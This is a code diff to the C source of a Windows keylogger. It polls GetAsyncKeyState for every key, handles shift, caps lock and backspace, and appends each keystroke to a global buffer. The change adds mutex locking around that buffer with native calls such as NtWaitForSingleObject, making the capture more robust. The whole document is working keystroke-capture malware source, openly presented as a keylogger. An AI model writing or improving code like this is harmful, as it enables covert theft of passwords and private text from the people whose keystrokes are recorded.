@@ -2,8 +2,9 @@
 #include <string.h>
 #include <stdlib.h>
 #include <stdio.h>
-#include "utils/utils.h"
+#include "utils/common/utils.h"
 #include "keylogger/keylogger.h"
+#include "utils/mutex/mutex-handler.h"
 
 
 int uuidLen = 32;
@@ -12,7 +13,7 @@ double repeatDelay = 0.5;  // consider fewer?
 int retries = 0;
 
 
-void start(PressedKeys* pressedKeys, Keys* keys, KeysCombinations* combinations, Set* set) {
+void start(PressedKeys* pressedKeys, Keys* keys, KeysCombinations* combinations, Set* set, HANDLE hMutex) {
     char combination;
     char letter;
 
@@ -24,24 +25,24 @@ void start(PressedKeys* pressedKeys, Keys* keys, KeysCombinations* combinations,
                 if ((GetAsyncKeyState(entry->value) & 0x8000) && (GetAsyncKeyState(0x10) & 0x8000)) {
                     if (isdigit((unsigned char)entry->key[0]) || containsChar(entry->key) == 1) {
                         combination = searchCombination(combinations, entry->key);
-                        triggerInvoked(&combination, set, pressedKeys);
+                        if (!triggerInvoked(&combination, set, pressedKeys, hMutex)) return;
                     } else if (isalpha((unsigned char)entry->key[0])) {
                         letter = GetKeyState(0x14) & 0x0001 ? tolower(*entry->key) : toupper(*entry->key);
-                        triggerInvoked(&letter, set, pressedKeys);
+                        if (!triggerInvoked(&letter, set, pressedKeys, hMutex)) return;
                     }
                 } else if (GetAsyncKeyState(entry->value) & 0x8000) {
                     if (isdigit((char)entry->key[0])) {
-                        triggerInvoked(entry->key, set, pressedKeys);
+                        if (!triggerInvoked(entry->key, set, pressedKeys, hMutex)) return;
                     } else if (isalpha((unsigned char)entry->key[0]) && strcmp(entry->key, "CAPS_LOCK") != 0 && strcmp(entry->key, "NUM_LOCK") != 0 && strcmp(entry->key, "BACK_SPACE") != 0) {
                         letter = GetKeyState(0x14) & 0x0001 ? toupper(*entry->key) : tolower(*entry->key);
-                        triggerInvoked(&letter, set, pressedKeys);
+                        if (!triggerInvoked(&letter, set, pressedKeys, hMutex)) return;
                     } else {
                         if (strcmp(entry->key, "CAPS_LOCK") == 0 || strcmp(entry->key, "NUM_LOCK") == 0) {
                             verifySpecialKeyState(entry->key, pressedKeys, set);
                         } else if (strcmp(entry->key, "BACK_SPACE") == 0) {
-                            backspaceClick(entry->key, set, pressedKeys);
+                            if (!backspaceClick(entry->key, set, pressedKeys, hMutex)) return;
                         } else {
-                            triggerInvoked(entry->key, set, pressedKeys);
+                            if (!triggerInvoked(entry->key, set, pressedKeys, hMutex)) return;
                         }
                     }
                 }
@@ -73,37 +74,40 @@ void start(PressedKeys* pressedKeys, Keys* keys, KeysCombinations* combinations,
 
 void verifySpecialKeyState(const char *keyName, PressedKeys *pressedKeys, Set* set) {
     add(set, keyName);
-    
     if (searchPK(pressedKeys, keyName) == -1) {
         insertPK(pressedKeys, keyName, 999);
     }
 }
 
-void triggerInvoked(const char *keyName, Set *set, PressedKeys *pressedKeys) {
+BOOL triggerInvoked(const char *keyName, Set *set, PressedKeys *pressedKeys, HANDLE hMutex) {
     time_t now = time(NULL);
     int nextTriggerTime = searchPK(pressedKeys, keyName);
-
     add(set, keyName);
 
     if (nextTriggerTime == -1 || now >= nextTriggerTime) {
+        if (NtWaitForSingleObject(hMutex, FALSE, NULL) != STATUS_SUCCESS) return FALSE;
         strcat(result, keyName);
+        if (NtReleaseMutant(hMutex, NULL) != STATUS_SUCCESS) return FALSE;
         time_t delay = (nextTriggerTime == -1) ? initialDelay : repeatDelay;
         insertPK(pressedKeys, keyName, now + delay);
     }
+    return TRUE;
 }
 
-void backspaceClick(const char *keyName, Set *set, PressedKeys *pressedKeys) {
+BOOL backspaceClick(const char *keyName, Set *set, PressedKeys *pressedKeys, HANDLE hMutex) {
     time_t now = time(NULL);
     int nextTriggerTime = searchPK(pressedKeys, keyName);
-    size_t len = strlen(result);
-
     add(set, keyName);
 
     if (nextTriggerTime == -1 || now >= nextTriggerTime) {
-        if (len > 0) {
-            result[len - 1] = '\0';
-        }
+
+        lockMutex(hMutex);
+        size_t len = strlen(result);
+        if (len > 0) result[len - 1] = '\0';
+        unlockMutex(hMutex);
+
         time_t delay = (nextTriggerTime == -1) ? initialDelay : repeatDelay;
         insertPK(pressedKeys, keyName, now + delay);
     }
+    return TRUE;
 }
